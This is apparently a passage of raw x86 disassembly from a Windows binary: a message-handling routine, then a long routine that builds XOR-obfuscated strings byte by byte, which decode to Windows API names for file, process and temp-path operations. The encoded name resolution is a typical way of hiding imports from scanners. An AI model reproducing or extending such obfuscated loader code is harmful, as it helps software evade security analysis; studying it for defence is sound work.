  4027a5:	2d c8 00 00 00       	sub    eax,0xc8
  4027aa:	0f 84 93 00 00 00    	je     0x402843
  4027b0:	48                   	dec    eax
  4027b1:	0f 84 8c 00 00 00    	je     0x402843
  4027b7:	48                   	dec    eax
  4027b8:	0f 84 a7 00 00 00    	je     0x402865
  4027be:	48                   	dec    eax
  4027bf:	74 29                	je     0x4027ea
  4027c1:	83 e8 61             	sub    eax,0x61
  4027c4:	0f 85 a3 00 00 00    	jne    0x40286d
  4027ca:	6a 44                	push   0x44
  4027cc:	68 78 25 42 00       	push   0x422578
  4027d1:	68 88 25 42 00       	push   0x422588
  4027d6:	ff 75 08             	push   DWORD PTR [ebp+0x8]
  4027d9:	ff 15 78 11 42 00    	call   DWORD PTR ds:0x421178
  4027df:	83 f8 06             	cmp    eax,0x6
  4027e2:	0f 85 85 00 00 00    	jne    0x40286d
  4027e8:	eb 7b                	jmp    0x402865
  4027ea:	8b 75 08             	mov    esi,DWORD PTR [ebp+0x8]
  4027ed:	6a 00                	push   0x0
  4027ef:	68 e9 22 40 00       	push   0x4022e9
  4027f4:	56                   	push   esi
  4027f5:	68 f6 01 00 00       	push   0x1f6
  4027fa:	6a 00                	push   0x0
  4027fc:	ff 15 5c 11 42 00    	call   DWORD PTR ds:0x42115c
  402802:	50                   	push   eax
  402803:	ff 15 bc 11 42 00    	call   DWORD PTR ds:0x4211bc
  402809:	83 f8 01             	cmp    eax,0x1
  40280c:	75 0e                	jne    0x40281c
  40280e:	6a 40                	push   0x40
  402810:	68 1c 25 42 00       	push   0x42251c
  402815:	68 24 25 42 00       	push   0x422524
  40281a:	eb 24                	jmp    0x402840
  40281c:	83 f8 02             	cmp    eax,0x2
  40281f:	75 0e                	jne    0x40282f
  402821:	6a 40                	push   0x40
  402823:	68 1c 25 42 00       	push   0x42251c
  402828:	68 40 25 42 00       	push   0x422540
  40282d:	eb 11                	jmp    0x402840
  40282f:	83 f8 ff             	cmp    eax,0xffffffff
  402832:	75 39                	jne    0x40286d
  402834:	6a 40                	push   0x40
  402836:	68 60 25 42 00       	push   0x422560
  40283b:	68 68 25 42 00       	push   0x422568
  402840:	56                   	push   esi
  402841:	eb 0f                	jmp    0x402852
  402843:	6a 30                	push   0x30
  402845:	68 08 4c 48 00       	push   0x484c08
  40284a:	68 fc 24 42 00       	push   0x4224fc
  40284f:	ff 75 08             	push   DWORD PTR [ebp+0x8]
  402852:	ff 15 78 11 42 00    	call   DWORD PTR ds:0x421178
  402858:	eb 13                	jmp    0x40286d
  40285a:	6a 01                	push   0x1
  40285c:	ff 75 08             	push   DWORD PTR [ebp+0x8]
  40285f:	ff 15 90 11 42 00    	call   DWORD PTR ds:0x421190
  402865:	6a 00                	push   0x0
  402867:	ff 15 94 11 42 00    	call   DWORD PTR ds:0x421194
  40286d:	33 c0                	xor    eax,eax
  40286f:	5e                   	pop    esi
  402870:	5d                   	pop    ebp
  402871:	c2 10 00             	ret    0x10
  402874:	55                   	push   ebp
  402875:	8d 6c 24 88          	lea    ebp,[esp-0x78]
  402879:	81 ec 20 02 00 00    	sub    esp,0x220
  40287f:	b0 55                	mov    al,0x55
  402881:	c6 85 58 fe ff ff 3e 	mov    BYTE PTR [ebp-0x1a8],0x3e
  402888:	88 85 59 fe ff ff    	mov    BYTE PTR [ebp-0x1a7],al
  40288e:	c6 85 5a fe ff ff 30 	mov    BYTE PTR [ebp-0x1a6],0x30
  402895:	88 85 5b fe ff ff    	mov    BYTE PTR [ebp-0x1a5],al
  40289b:	c6 85 5c fe ff ff 27 	mov    BYTE PTR [ebp-0x1a4],0x27
  4028a2:	88 85 5d fe ff ff    	mov    BYTE PTR [ebp-0x1a3],al
  4028a8:	c6 85 5e fe ff ff 3b 	mov    BYTE PTR [ebp-0x1a2],0x3b
  4028af:	88 85 5f fe ff ff    	mov    BYTE PTR [ebp-0x1a1],al
  4028b5:	c6 85 60 fe ff ff 30 	mov    BYTE PTR [ebp-0x1a0],0x30
  4028bc:	88 85 61 fe ff ff    	mov    BYTE PTR [ebp-0x19f],al
  4028c2:	c6 85 62 fe ff ff 39 	mov    BYTE PTR [ebp-0x19e],0x39
  4028c9:	88 85 63 fe ff ff    	mov    BYTE PTR [ebp-0x19d],al
  4028cf:	c6 85 64 fe ff ff 66 	mov    BYTE PTR [ebp-0x19c],0x66
  4028d6:	88 85 65 fe ff ff    	mov    BYTE PTR [ebp-0x19b],al
  4028dc:	c6 85 66 fe ff ff 67 	mov    BYTE PTR [ebp-0x19a],0x67
  4028e3:	88 85 67 fe ff ff    	mov    BYTE PTR [ebp-0x199],al
  4028e9:	c6 85 68 fe ff ff 7b 	mov    BYTE PTR [ebp-0x198],0x7b
  4028f0:	88 85 69 fe ff ff    	mov    BYTE PTR [ebp-0x197],al
  4028f6:	c6 85 6a fe ff ff 31 	mov    BYTE PTR [ebp-0x196],0x31
  4028fd:	88 85 6b fe ff ff    	mov    BYTE PTR [ebp-0x195],al
  402903:	c6 85 6c fe ff ff 39 	mov    BYTE PTR [ebp-0x194],0x39
  40290a:	88 85 6d fe ff ff    	mov    BYTE PTR [ebp-0x193],al
  402910:	c6 85 6e fe ff ff 39 	mov    BYTE PTR [ebp-0x192],0x39
  402917:	88 85 6f fe ff ff    	mov    BYTE PTR [ebp-0x191],al
  40291d:	88 85 70 fe ff ff    	mov    BYTE PTR [ebp-0x190],al
  402923:	88 85 71 fe ff ff    	mov    BYTE PTR [ebp-0x18f],al
  402929:	c6 45 1c 16          	mov    BYTE PTR [ebp+0x1c],0x16
  40292d:	c6 45 1d 39          	mov    BYTE PTR [ebp+0x1d],0x39
  402931:	c6 45 1e 3a          	mov    BYTE PTR [ebp+0x1e],0x3a
  402935:	c6 45 1f 26          	mov    BYTE PTR [ebp+0x1f],0x26
  402939:	c6 45 20 30          	mov    BYTE PTR [ebp+0x20],0x30
  40293d:	c6 45 21 1d          	mov    BYTE PTR [ebp+0x21],0x1d
  402941:	c6 45 22 34          	mov    BYTE PTR [ebp+0x22],0x34
  402945:	c6 45 23 3b          	mov    BYTE PTR [ebp+0x23],0x3b
  402949:	c6 45 24 31          	mov    BYTE PTR [ebp+0x24],0x31
  40294d:	c6 45 25 39          	mov    BYTE PTR [ebp+0x25],0x39
  402951:	c6 45 26 30          	mov    BYTE PTR [ebp+0x26],0x30
  402955:	88 45 27             	mov    BYTE PTR [ebp+0x27],al
  402958:	c6 85 1c ff ff ff 12 	mov    BYTE PTR [ebp-0xe4],0x12
  40295f:	c6 85 1d ff ff ff 30 	mov    BYTE PTR [ebp-0xe3],0x30
  402966:	c6 85 1e ff ff ff 21 	mov    BYTE PTR [ebp-0xe2],0x21
  40296d:	c6 85 1f ff ff ff 18 	mov    BYTE PTR [ebp-0xe1],0x18
  402974:	c6 85 20 ff ff ff 3a 	mov    BYTE PTR [ebp-0xe0],0x3a
  40297b:	c6 85 21 ff ff ff 31 	mov    BYTE PTR [ebp-0xdf],0x31
  402982:	c6 85 22 ff ff ff 20 	mov    BYTE PTR [ebp-0xde],0x20
  402989:	c6 85 23 ff ff ff 39 	mov    BYTE PTR [ebp-0xdd],0x39
  402990:	c6 85 24 ff ff ff 30 	mov    BYTE PTR [ebp-0xdc],0x30
  402997:	c6 85 25 ff ff ff 13 	mov    BYTE PTR [ebp-0xdb],0x13
  40299e:	c6 85 26 ff ff ff 3c 	mov    BYTE PTR [ebp-0xda],0x3c
  4029a5:	c6 85 27 ff ff ff 39 	mov    BYTE PTR [ebp-0xd9],0x39
  4029ac:	c6 85 28 ff ff ff 30 	mov    BYTE PTR [ebp-0xd8],0x30
  4029b3:	c6 85 29 ff ff ff 1b 	mov    BYTE PTR [ebp-0xd7],0x1b
  4029ba:	c6 85 2a ff ff ff 34 	mov    BYTE PTR [ebp-0xd6],0x34
  4029c1:	c6 85 2b ff ff ff 38 	mov    BYTE PTR [ebp-0xd5],0x38
  4029c8:	c6 85 2c ff ff ff 30 	mov    BYTE PTR [ebp-0xd4],0x30
  4029cf:	c6 85 2d ff ff ff 14 	mov    BYTE PTR [ebp-0xd3],0x14
  4029d6:	88 85 2e ff ff ff    	mov    BYTE PTR [ebp-0xd2],al
  4029dc:	c6 85 b8 fe ff ff 12 	mov    BYTE PTR [ebp-0x148],0x12
  4029e3:	c6 85 b9 fe ff ff 30 	mov    BYTE PTR [ebp-0x147],0x30
  4029ea:	c6 85 ba fe ff ff 21 	mov    BYTE PTR [ebp-0x146],0x21
  4029f1:	c6 85 bb fe ff ff 06 	mov    BYTE PTR [ebp-0x145],0x6
  4029f8:	c6 85 bc fe ff ff 2c 	mov    BYTE PTR [ebp-0x144],0x2c
  4029ff:	c6 85 bd fe ff ff 26 	mov    BYTE PTR [ebp-0x143],0x26
  402a06:	c6 85 be fe ff ff 21 	mov    BYTE PTR [ebp-0x142],0x21
  402a0d:	c6 85 bf fe ff ff 30 	mov    BYTE PTR [ebp-0x141],0x30
  402a14:	c6 85 c0 fe ff ff 38 	mov    BYTE PTR [ebp-0x140],0x38
  402a1b:	c6 85 c1 fe ff ff 11 	mov    BYTE PTR [ebp-0x13f],0x11
  402a22:	c6 85 c2 fe ff ff 3c 	mov    BYTE PTR [ebp-0x13e],0x3c
  402a29:	c6 85 c3 fe ff ff 27 	mov    BYTE PTR [ebp-0x13d],0x27
  402a30:	c6 85 c4 fe ff ff 30 	mov    BYTE PTR [ebp-0x13c],0x30
  402a37:	c6 85 c5 fe ff ff 36 	mov    BYTE PTR [ebp-0x13b],0x36
  402a3e:	c6 85 c6 fe ff ff 21 	mov    BYTE PTR [ebp-0x13a],0x21
  402a45:	c6 85 c7 fe ff ff 3a 	mov    BYTE PTR [ebp-0x139],0x3a
  402a4c:	c6 85 c8 fe ff ff 27 	mov    BYTE PTR [ebp-0x138],0x27
  402a53:	c6 85 c9 fe ff ff 2c 	mov    BYTE PTR [ebp-0x137],0x2c
  402a5a:	c6 85 ca fe ff ff 14 	mov    BYTE PTR [ebp-0x136],0x14
  402a61:	88 85 cb fe ff ff    	mov    BYTE PTR [ebp-0x135],al
  402a67:	c6 45 04 16          	mov    BYTE PTR [ebp+0x4],0x16
  402a6b:	c6 45 05 27          	mov    BYTE PTR [ebp+0x5],0x27
  402a6f:	c6 45 06 30          	mov    BYTE PTR [ebp+0x6],0x30
  402a73:	c6 45 07 34          	mov    BYTE PTR [ebp+0x7],0x34
  402a77:	c6 45 08 21          	mov    BYTE PTR [ebp+0x8],0x21
  402a7b:	c6 45 09 30          	mov    BYTE PTR [ebp+0x9],0x30
  402a7f:	c6 45 0a 13          	mov    BYTE PTR [ebp+0xa],0x13
  402a83:	c6 45 0b 3c          	mov    BYTE PTR [ebp+0xb],0x3c
  402a87:	c6 45 0c 39          	mov    BYTE PTR [ebp+0xc],0x39
  402a8b:	c6 45 0d 30          	mov    BYTE PTR [ebp+0xd],0x30
  402a8f:	c6 45 0e 14          	mov    BYTE PTR [ebp+0xe],0x14
  402a93:	88 45 0f             	mov    BYTE PTR [ebp+0xf],al
  402a96:	c6 45 b0 06          	mov    BYTE PTR [ebp-0x50],0x6
  402a9a:	c6 45 b1 30          	mov    BYTE PTR [ebp-0x4f],0x30
  402a9e:	c6 45 b2 21          	mov    BYTE PTR [ebp-0x4e],0x21
  402aa2:	c6 45 b3 19          	mov    BYTE PTR [ebp-0x4d],0x19
  402aa6:	c6 45 b4 34          	mov    BYTE PTR [ebp-0x4c],0x34
  402aaa:	c6 45 b5 26          	mov    BYTE PTR [ebp-0x4b],0x26
  402aae:	c6 45 b6 21          	mov    BYTE PTR [ebp-0x4a],0x21
  402ab2:	c6 45 b7 10          	mov    BYTE PTR [ebp-0x49],0x10
  402ab6:	c6 45 b8 27          	mov    BYTE PTR [ebp-0x48],0x27
  402aba:	c6 45 b9 27          	mov    BYTE PTR [ebp-0x47],0x27
  402abe:	c6 45 ba 3a          	mov    BYTE PTR [ebp-0x46],0x3a
  402ac2:	c6 45 bb 27          	mov    BYTE PTR [ebp-0x45],0x27
  402ac6:	88 45 bc             	mov    BYTE PTR [ebp-0x44],al
  402ac9:	c6 45 a0 12          	mov    BYTE PTR [ebp-0x60],0x12
  402acd:	c6 45 a1 30          	mov    BYTE PTR [ebp-0x5f],0x30
  402ad1:	c6 45 a2 21          	mov    BYTE PTR [ebp-0x5e],0x21
  402ad5:	c6 45 a3 19          	mov    BYTE PTR [ebp-0x5d],0x19
  402ad9:	c6 45 a4 34          	mov    BYTE PTR [ebp-0x5c],0x34
  402add:	c6 45 a5 26          	mov    BYTE PTR [ebp-0x5b],0x26
  402ae1:	c6 45 a6 21          	mov    BYTE PTR [ebp-0x5a],0x21
  402ae5:	c6 45 a7 10          	mov    BYTE PTR [ebp-0x59],0x10
  402ae9:	c6 45 a8 27          	mov    BYTE PTR [ebp-0x58],0x27
  402aed:	c6 45 a9 27          	mov    BYTE PTR [ebp-0x57],0x27
  402af1:	c6 45 aa 3a          	mov    BYTE PTR [ebp-0x56],0x3a
  402af5:	c6 45 ab 27          	mov    BYTE PTR [ebp-0x55],0x27
  402af9:	88 45 ac             	mov    BYTE PTR [ebp-0x54],al
  402afc:	c6 85 f4 fe ff ff 16 	mov    BYTE PTR [ebp-0x10c],0x16
  402b03:	c6 85 f5 fe ff ff 27 	mov    BYTE PTR [ebp-0x10b],0x27
  402b0a:	c6 85 f6 fe ff ff 30 	mov    BYTE PTR [ebp-0x10a],0x30
  402b11:	c6 85 f7 fe ff ff 34 	mov    BYTE PTR [ebp-0x109],0x34
  402b18:	c6 85 f8 fe ff ff 21 	mov    BYTE PTR [ebp-0x108],0x21
  402b1f:	c6 85 f9 fe ff ff 30 	mov    BYTE PTR [ebp-0x107],0x30
  402b26:	c6 85 fa fe ff ff 13 	mov    BYTE PTR [ebp-0x106],0x13
  402b2d:	c6 85 fb fe ff ff 3c 	mov    BYTE PTR [ebp-0x105],0x3c
  402b34:	c6 85 fc fe ff ff 39 	mov    BYTE PTR [ebp-0x104],0x39
  402b3b:	c6 85 fd fe ff ff 30 	mov    BYTE PTR [ebp-0x103],0x30
  402b42:	c6 85 fe fe ff ff 18 	mov    BYTE PTR [ebp-0x102],0x18
  402b49:	c6 85 ff fe ff ff 34 	mov    BYTE PTR [ebp-0x101],0x34
  402b50:	c6 85 00 ff ff ff 25 	mov    BYTE PTR [ebp-0x100],0x25
  402b57:	c6 85 01 ff ff ff 25 	mov    BYTE PTR [ebp-0xff],0x25
  402b5e:	c6 85 02 ff ff ff 3c 	mov    BYTE PTR [ebp-0xfe],0x3c
  402b65:	c6 85 03 ff ff ff 3b 	mov    BYTE PTR [ebp-0xfd],0x3b
  402b6c:	c6 85 04 ff ff ff 32 	mov    BYTE PTR [ebp-0xfc],0x32
  402b73:	c6 85 05 ff ff ff 14 	mov    BYTE PTR [ebp-0xfb],0x14
  402b7a:	88 85 06 ff ff ff    	mov    BYTE PTR [ebp-0xfa],al
  402b80:	c6 45 90 18          	mov    BYTE PTR [ebp-0x70],0x18
  402b84:	c6 45 91 34          	mov    BYTE PTR [ebp-0x6f],0x34
  402b88:	c6 45 92 25          	mov    BYTE PTR [ebp-0x6e],0x25
  402b8c:	c6 45 93 03          	mov    BYTE PTR [ebp-0x6d],0x3
  402b90:	c6 45 94 3c          	mov    BYTE PTR [ebp-0x6c],0x3c
  402b94:	c6 45 95 30          	mov    BYTE PTR [ebp-0x6b],0x30
  402b98:	c6 45 96 22          	mov    BYTE PTR [ebp-0x6a],0x22
  402b9c:	c6 45 97 1a          	mov    BYTE PTR [ebp-0x69],0x1a
  402ba0:	c6 45 98 33          	mov    BYTE PTR [ebp-0x68],0x33
  402ba4:	c6 45 99 13          	mov    BYTE PTR [ebp-0x67],0x13
  402ba8:	c6 45 9a 3c          	mov    BYTE PTR [ebp-0x66],0x3c
  402bac:	c6 45 9b 39          	mov    BYTE PTR [ebp-0x65],0x39
  402bb0:	c6 45 9c 30          	mov    BYTE PTR [ebp-0x64],0x30
  402bb4:	88 45 9d             	mov    BYTE PTR [ebp-0x63],al
  402bb7:	c6 45 c0 12          	mov    BYTE PTR [ebp-0x40],0x12
  402bbb:	c6 45 c1 30          	mov    BYTE PTR [ebp-0x3f],0x30
  402bbf:	c6 45 c2 21          	mov    BYTE PTR [ebp-0x3e],0x21
  402bc3:	c6 45 c3 01          	mov    BYTE PTR [ebp-0x3d],0x1
  402bc7:	c6 45 c4 30          	mov    BYTE PTR [ebp-0x3c],0x30
  402bcb:	c6 45 c5 38          	mov    BYTE PTR [ebp-0x3b],0x38
  402bcf:	c6 45 c6 25          	mov    BYTE PTR [ebp-0x3a],0x25
  402bd3:	c6 45 c7 05          	mov    BYTE PTR [ebp-0x39],0x5
  402bd7:	c6 45 c8 34          	mov    BYTE PTR [ebp-0x38],0x34
  402bdb:	c6 45 c9 21          	mov    BYTE PTR [ebp-0x37],0x21
  402bdf:	c6 45 ca 3d          	mov    BYTE PTR [ebp-0x36],0x3d
  402be3:	c6 45 cb 14          	mov    BYTE PTR [ebp-0x35],0x14
  402be7:	88 45 cc             	mov    BYTE PTR [ebp-0x34],al
  402bea:	c6 45 40 11          	mov    BYTE PTR [ebp+0x40],0x11
  402bee:	c6 45 41 30          	mov    BYTE PTR [ebp+0x41],0x30
  402bf2:	c6 45 42 39          	mov    BYTE PTR [ebp+0x42],0x39
  402bf6:	c6 45 43 30          	mov    BYTE PTR [ebp+0x43],0x30
  402bfa:	c6 45 44 21          	mov    BYTE PTR [ebp+0x44],0x21
  402bfe:	c6 45 45 30          	mov    BYTE PTR [ebp+0x45],0x30
  402c02:	c6 45 46 13          	mov    BYTE PTR [ebp+0x46],0x13
  402c06:	c6 45 47 3c          	mov    BYTE PTR [ebp+0x47],0x3c
  402c0a:	c6 45 48 39          	mov    BYTE PTR [ebp+0x48],0x39
  402c0e:	c6 45 49 30          	mov    BYTE PTR [ebp+0x49],0x30
  402c12:	c6 45 4a 14          	mov    BYTE PTR [ebp+0x4a],0x14
  402c16:	88 45 4b             	mov    BYTE PTR [ebp+0x4b],al
  402c19:	c6 45 80 16          	mov    BYTE PTR [ebp-0x80],0x16
  402c1d:	c6 45 81 27          	mov    BYTE PTR [ebp-0x7f],0x27
  402c21:	c6 45 82 30          	mov    BYTE PTR [ebp-0x7e],0x30
  402c25:	c6 45 83 34          	mov    BYTE PTR [ebp-0x7d],0x34
  402c29:	c6 45 84 21          	mov    BYTE PTR [ebp-0x7c],0x21
  402c2d:	c6 45 85 30          	mov    BYTE PTR [ebp-0x7b],0x30
  402c31:	c6 45 86 05          	mov    BYTE PTR [ebp-0x7a],0x5
  402c35:	c6 45 87 27          	mov    BYTE PTR [ebp-0x79],0x27
  402c39:	c6 45 88 3a          	mov    BYTE PTR [ebp-0x78],0x3a
  402c3d:	c6 45 89 36          	mov    BYTE PTR [ebp-0x77],0x36
  402c41:	c6 45 8a 30          	mov    BYTE PTR [ebp-0x76],0x30
  402c45:	c6 45 8b 26          	mov    BYTE PTR [ebp-0x75],0x26
  402c49:	c6 45 8c 26          	mov    BYTE PTR [ebp-0x74],0x26
  402c4d:	c6 45 8d 02          	mov    BYTE PTR [ebp-0x73],0x2
  402c51:	88 45 8e             	mov    BYTE PTR [ebp-0x72],al
  402c54:	c6 45 ec 18          	mov    BYTE PTR [ebp-0x14],0x18
  402c58:	c6 45 ed 3a          	mov    BYTE PTR [ebp-0x13],0x3a
  402c5c:	c6 45 ee 23          	mov    BYTE PTR [ebp-0x12],0x23
  402c60:	c6 45 ef 30          	mov    BYTE PTR [ebp-0x11],0x30
  402c64:	c6 45 f0 13          	mov    BYTE PTR [ebp-0x10],0x13
  402c68:	c6 45 f1 3c          	mov    BYTE PTR [ebp-0xf],0x3c
  402c6c:	c6 45 f2 39          	mov    BYTE PTR [ebp-0xe],0x39
  402c70:	c6 45 f3 30          	mov    BYTE PTR [ebp-0xd],0x30
  402c74:	c6 45 f4 10          	mov    BYTE PTR [ebp-0xc],0x10
  402c78:	c6 45 f5 2d          	mov    BYTE PTR [ebp-0xb],0x2d
  402c7c:	c6 45 f6 14          	mov    BYTE PTR [ebp-0xa],0x14
  402c80:	88 45 f7             	mov    BYTE PTR [ebp-0x9],al
  402c83:	c6 85 08 ff ff ff 12 	mov    BYTE PTR [ebp-0xf8],0x12
  402c8a:	c6 85 09 ff ff ff 30 	mov    BYTE PTR [ebp-0xf7],0x30
  402c91:	c6 85 0a ff ff ff 21 	mov    BYTE PTR [ebp-0xf6],0x21
  402c98:	c6 85 0b ff ff ff 18 	mov    BYTE PTR [ebp-0xf5],0x18
  402c9f:	c6 85 0c ff ff ff 3a 	mov    BYTE PTR [ebp-0xf4],0x3a
  402ca6:	c6 85 0d ff ff ff 31 	mov    BYTE PTR [ebp-0xf3],0x31
  402cad:	c6 85 0e ff ff ff 20 	mov    BYTE PTR [ebp-0xf2],0x20
  402cb4:	c6 85 0f ff ff ff 39 	mov    BYTE PTR [ebp-0xf1],0x39
  402cbb:	c6 85 10 ff ff ff 30 	mov    BYTE PTR [ebp-0xf0],0x30
  402cc2:	c6 85 11 ff ff ff 13 	mov    BYTE PTR [ebp-0xef],0x13
  402cc9:	c6 85 12 ff ff ff 3c 	mov    BYTE PTR [ebp-0xee],0x3c
  402cd0:	c6 85 13 ff ff ff 39 	mov    BYTE PTR [ebp-0xed],0x39
  402cd7:	c6 85 14 ff ff ff 30 	mov    BYTE PTR [ebp-0xec],0x30
  402cde:	c6 85 15 ff ff ff 1b 	mov    BYTE PTR [ebp-0xeb],0x1b
  402ce5:	c6 85 16 ff ff ff 34 	mov    BYTE PTR [ebp-0xea],0x34
  402cec:	c6 85 17 ff ff ff 38 	mov    BYTE PTR [ebp-0xe9],0x38
  402cf3:	c6 85 18 ff ff ff 30 	mov    BYTE PTR [ebp-0xe8],0x30
  402cfa:	c6 85 19 ff ff ff 02 	mov    BYTE PTR [ebp-0xe7],0x2
  402d01:	88 85 1a ff ff ff    	mov    BYTE PTR [ebp-0xe6],al
  402d07:	c6 45 34 16          	mov    BYTE PTR [ebp+0x34],0x16
  402d0b:	c6 45 35 27          	mov    BYTE PTR [ebp+0x35],0x27
  402d0f:	c6 45 36 30          	mov    BYTE PTR [ebp+0x36],0x30
  402d13:	c6 45 37 34          	mov    BYTE PTR [ebp+0x37],0x34
  402d17:	c6 45 38 21          	mov    BYTE PTR [ebp+0x38],0x21
  402d1b:	c6 45 39 30          	mov    BYTE PTR [ebp+0x39],0x30
  402d1f:	c6 45 3a 13          	mov    BYTE PTR [ebp+0x3a],0x13
  402d23:	c6 45 3b 3c          	mov    BYTE PTR [ebp+0x3b],0x3c
  402d27:	c6 45 3c 39          	mov    BYTE PTR [ebp+0x3c],0x39
  402d2b:	c6 45 3d 30          	mov    BYTE PTR [ebp+0x3d],0x30
  402d2f:	c6 45 3e 02          	mov    BYTE PTR [ebp+0x3e],0x2
  402d33:	88 45 3f             	mov    BYTE PTR [ebp+0x3f],al
  402d36:	c6 45 64 02          	mov    BYTE PTR [ebp+0x64],0x2
  402d3a:	c6 45 65 27          	mov    BYTE PTR [ebp+0x65],0x27
  402d3e:	c6 45 66 3c          	mov    BYTE PTR [ebp+0x66],0x3c
  402d42:	c6 45 67 21          	mov    BYTE PTR [ebp+0x67],0x21
  402d46:	c6 45 68 30          	mov    BYTE PTR [ebp+0x68],0x30
  402d4a:	c6 45 69 13          	mov    BYTE PTR [ebp+0x69],0x13
  402d4e:	c6 45 6a 3c          	mov    BYTE PTR [ebp+0x6a],0x3c
  402d52:	c6 45 6b 39          	mov    BYTE PTR [ebp+0x6b],0x39
  402d56:	c6 45 6c 30          	mov    BYTE PTR [ebp+0x6c],0x30
  402d5a:	88 45 6d             	mov    BYTE PTR [ebp+0x6d],al
  402d5d:	c6 85 cc fe ff ff 12 	mov    BYTE PTR [ebp-0x134],0x12
  402d64:	c6 85 cd fe ff ff 30 	mov    BYTE PTR [ebp-0x133],0x30
  402d6b:	c6 85 ce fe ff ff 21 	mov    BYTE PTR [ebp-0x132],0x21
  402d72:	c6 85 cf fe ff ff 06 	mov    BYTE PTR [ebp-0x131],0x6
  402d79:	c6 85 d0 fe ff ff 2c 	mov    BYTE PTR [ebp-0x130],0x2c
  402d80:	c6 85 d1 fe ff ff 26 	mov    BYTE PTR [ebp-0x12f],0x26
  402d87:	c6 85 d2 fe ff ff 21 	mov    BYTE PTR [ebp-0x12e],0x21
  402d8e:	c6 85 d3 fe ff ff 30 	mov    BYTE PTR [ebp-0x12d],0x30
  402d95:	c6 85 d4 fe ff ff 38 	mov    BYTE PTR [ebp-0x12c],0x38
  402d9c:	c6 85 d5 fe ff ff 11 	mov    BYTE PTR [ebp-0x12b],0x11
  402da3:	c6 85 d6 fe ff ff 3c 	mov    BYTE PTR [ebp-0x12a],0x3c
  402daa:	c6 85 d7 fe ff ff 27 	mov    BYTE PTR [ebp-0x129],0x27
  402db1:	c6 85 d8 fe ff ff 30 	mov    BYTE PTR [ebp-0x128],0x30
  402db8:	c6 85 d9 fe ff ff 36 	mov    BYTE PTR [ebp-0x127],0x36
  402dbf:	c6 85 da fe ff ff 21 	mov    BYTE PTR [ebp-0x126],0x21
  402dc6:	c6 85 db fe ff ff 3a 	mov    BYTE PTR [ebp-0x125],0x3a
  402dcd:	c6 85 dc fe ff ff 27 	mov    BYTE PTR [ebp-0x124],0x27
  402dd4:	c6 85 dd fe ff ff 2c 	mov    BYTE PTR [ebp-0x123],0x2c
  402ddb:	c6 85 de fe ff ff 02 	mov    BYTE PTR [ebp-0x122],0x2
  402de2:	88 85 df fe ff ff    	mov    BYTE PTR [ebp-0x121],al
  402de8:	c6 85 30 ff ff ff 12 	mov    BYTE PTR [ebp-0xd0],0x12
  402def:	c6 85 31 ff ff ff 30 	mov    BYTE PTR [ebp-0xcf],0x30
  402df6:	c6 85 32 ff ff ff 21 	mov    BYTE PTR [ebp-0xce],0x21
  402dfd:	c6 85 33 ff ff ff 06 	mov    BYTE PTR [ebp-0xcd],0x6
  402e04:	c6 85 34 ff ff ff 3d 	mov    BYTE PTR [ebp-0xcc],0x3d
  402e0b:	c6 85 35 ff ff ff 3a 	mov    BYTE PTR [ebp-0xcb],0x3a
  402e12:	c6 85 36 ff ff ff 27 	mov    BYTE PTR [ebp-0xca],0x27
  402e19:	c6 85 37 ff ff ff 21 	mov    BYTE PTR [ebp-0xc9],0x21
  402e20:	c6 85 38 ff ff ff 05 	mov    BYTE PTR [ebp-0xc8],0x5
  402e27:	c6 85 39 ff ff ff 34 	mov    BYTE PTR [ebp-0xc7],0x34
  402e2e:	c6 85 3a ff ff ff 21 	mov    BYTE PTR [ebp-0xc6],0x21
  402e35:	c6 85 3b ff ff ff 3d 	mov    BYTE PTR [ebp-0xc5],0x3d
  402e3c:	c6 85 3c ff ff ff 1b 	mov    BYTE PTR [ebp-0xc4],0x1b
  402e43:	c6 85 3d ff ff ff 34 	mov    BYTE PTR [ebp-0xc3],0x34
  402e4a:	c6 85 3e ff ff ff 38 	mov    BYTE PTR [ebp-0xc2],0x38
  402e51:	c6 85 3f ff ff ff 30 	mov    BYTE PTR [ebp-0xc1],0x30
  402e58:	c6 85 40 ff ff ff 02 	mov    BYTE PTR [ebp-0xc0],0x2
  402e5f:	88 85 41 ff ff ff    	mov    BYTE PTR [ebp-0xbf],al
  402e65:	c6 85 44 ff ff ff 01 	mov    BYTE PTR [ebp-0xbc],0x1
  402e6c:	c6 85 45 ff ff ff 30 	mov    BYTE PTR [ebp-0xbb],0x30
  402e73:	c6 85 46 ff ff ff 27 	mov    BYTE PTR [ebp-0xba],0x27
  402e7a:	c6 85 47 ff ff ff 38 	mov    BYTE PTR [ebp-0xb9],0x38
  402e81:	c6 85 48 ff ff ff 3c 	mov    BYTE PTR [ebp-0xb8],0x3c
  402e88:	c6 85 49 ff ff ff 3b 	mov    BYTE PTR [ebp-0xb7],0x3b
  402e8f:	c6 85 4a ff ff ff 34 	mov    BYTE PTR [ebp-0xb6],0x34
  402e96:	c6 85 4b ff ff ff 21 	mov    BYTE PTR [ebp-0xb5],0x21
  402e9d:	c6 85 4c ff ff ff 30 	mov    BYTE PTR [ebp-0xb4],0x30
  402ea4:	c6 85 4d ff ff ff 05 	mov    BYTE PTR [ebp-0xb3],0x5
  402eab:	c6 85 4e ff ff ff 27 	mov    BYTE PTR [ebp-0xb2],0x27
  402eb2:	c6 85 4f ff ff ff 3a 	mov    BYTE PTR [ebp-0xb1],0x3a
  402eb9:	c6 85 50 ff ff ff 36 	mov    BYTE PTR [ebp-0xb0],0x36
  402ec0:	c6 85 51 ff ff ff 30 	mov    BYTE PTR [ebp-0xaf],0x30
  402ec7:	c6 85 52 ff ff ff 26 	mov    BYTE PTR [ebp-0xae],0x26
  402ece:	c6 85 53 ff ff ff 26 	mov    BYTE PTR [ebp-0xad],0x26
  402ed5:	88 85 54 ff ff ff    	mov    BYTE PTR [ebp-0xac],al
  402edb:	c6 85 e0 fe ff ff 12 	mov    BYTE PTR [ebp-0x120],0x12
  402ee2:	c6 85 e1 fe ff ff 30 	mov    BYTE PTR [ebp-0x11f],0x30
  402ee9:	c6 85 e2 fe ff ff 21 	mov    BYTE PTR [ebp-0x11e],0x21
  402ef0:	c6 85 e3 fe ff ff 10 	mov    BYTE PTR [ebp-0x11d],0x10
  402ef7:	c6 85 e4 fe ff ff 2d 	mov    BYTE PTR [ebp-0x11c],0x2d
  402efe:	c6 85 e5 fe ff ff 3c 	mov    BYTE PTR [ebp-0x11b],0x3c
  402f05:	c6 85 e6 fe ff ff 21 	mov    BYTE PTR [ebp-0x11a],0x21
  402f0c:	c6 85 e7 fe ff ff 16 	mov    BYTE PTR [ebp-0x119],0x16
  402f13:	c6 85 e8 fe ff ff 3a 	mov    BYTE PTR [ebp-0x118],0x3a
